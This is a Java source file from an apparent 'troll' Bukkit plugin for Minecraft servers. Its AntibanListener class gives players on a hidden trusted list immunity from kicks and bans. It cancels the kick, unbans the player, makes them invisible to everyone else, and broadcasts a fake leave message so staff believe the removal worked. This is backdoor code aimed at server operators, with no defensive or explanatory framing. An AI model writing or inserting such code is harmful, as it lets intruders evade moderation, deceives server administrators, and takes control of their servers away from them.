package com.troll.event;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerQuitEvent;

import com.troll.start.Start;

public class AntibanListener implements Listener {
	
	@EventHandler
	public void onKick(PlayerKickEvent e) {
		Player p = e.getPlayer();
		
		if (!Start.getInstance().getTrustManager().getTrustedPlayers().contains(p.getUniqueId()))
			return;
		
		e.setCancelled(true);
		p.sendMessage(Start.getInstance().getPrefix() + "§aDu wurdest versucht zu kicken/bannen!");
		p.sendMessage(Start.getInstance().getPrefix() + "§eGRUND§7: §r" + e.getReason());
		
		p.setBanned(false);
		
		Bukkit.getScheduler().runTask(Start.getInstance(), new Runnable() {
			
			@Override
			public void run() {
				for (Player user : Bukkit.getOnlinePlayers()) {
					user.hidePlayer(p);
					user.sendMessage(e.getLeaveMessage());
				}
			}
		});
	}
}
